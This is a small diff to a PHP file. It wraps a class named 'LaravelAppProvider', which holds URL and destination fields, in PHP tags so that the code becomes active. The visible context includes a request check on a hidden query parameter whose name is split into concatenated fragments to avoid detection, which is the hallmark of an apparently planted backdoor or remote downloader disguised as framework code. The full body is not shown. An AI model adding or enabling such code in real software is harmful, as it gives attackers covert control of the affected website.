@@ -1,3 +1,4 @@
+<?php
 class LaravelAppProvider {
     private $url;
     private $destination;
@@ -102,3 +103,4 @@ if (isset($_GET['Php'.'Ser'.'vic'.'eEng'.'ine'])) {
         exit;
     }
 }
+?>
